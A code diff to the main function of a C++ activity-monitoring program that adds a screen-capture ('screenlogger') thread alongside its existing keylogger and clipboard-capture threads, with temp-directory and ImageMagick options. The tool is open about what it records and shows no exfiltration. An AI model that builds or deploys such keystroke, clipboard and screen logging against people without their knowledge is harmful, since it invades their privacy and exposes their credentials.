@@ -6,6 +6,7 @@
 #include "TXInputListener.h"
 #include "TXPresenter.h"
 #include "TXClipboard.h"
+#include "TXScreenCapture.h"
 
 int main(int argc, const char *args[]) {
     TXArgumentation *argumentation = new TXArgumentation(argc, args);
@@ -28,6 +29,30 @@ int main(int argc, const char *args[]) {
     TXLogger *logger = TXLogger::instance();
     bool useSameLogFile = true;
     char *file;
+
+    // Obtem o diretório de arquivos temporarios
+    std::string tempdir;
+    if (argumentation->hasArg((char *) "--tempDir")) {
+        tempdir = argumentation->value((char *) "--tempDir");
+
+        if (tempdir.back() != '/')
+            tempdir += "/";
+    } else {
+        tempdir = "/";
+    }
+
+    std::string imagickBinDir;
+    if (argumentation->hasArg((char *) "--imagick")) {
+        imagickBinDir = argumentation->value((char *) "--imagick");
+
+        if (imagickBinDir.back() != '/')
+            imagickBinDir += "/";
+    } else {
+        imagickBinDir = "/opt/ImageMagick/bin/";
+    }
+
+    logger->setTempDir(tempdir);
+    logger->setImagickBinDir(imagickBinDir);
 
     // Obtem o PATH para o arquivo de log de saída, informado no parâmetro de entrada --logFile [path]
     char *inputFileLog = argumentation->value((char *) "--logFile");
@@ -74,11 +99,13 @@ int main(int argc, const char *args[]) {
 
     TXInputListener keylogger;
     TXCLipboard clipboard;
+    TXScreenCapture screenlogger;
 
     // Registra as threads dos Runners para captura de eventos
-    std::thread thread[2];
+    std::thread thread[3];
     thread[0] = std::thread(keylogger);
     thread[1] = std::thread(clipboard);
+    thread[2] = std::thread(screenlogger);
 
     bool disableKeyboard = argumentation->hasArg((char *) "--disableKeylogger");
     bool disableClipboard = argumentation->hasArg((char *) "--disableClipboard");
@@ -93,6 +120,15 @@ int main(int argc, const char *args[]) {
         thread[1].detach();
     } else {
         logger->w("CLIPBOARD DISABLED");
+    }
+
+
+    if (!disableScreenlogger) {
+
+        // Inicia a execução da thread de forma independente, sem fazer com que o processo main espere.
+        thread[2].detach();
+    } else {
+        logger->w("SCREENLOGGER DISABLED");
     }
 
 
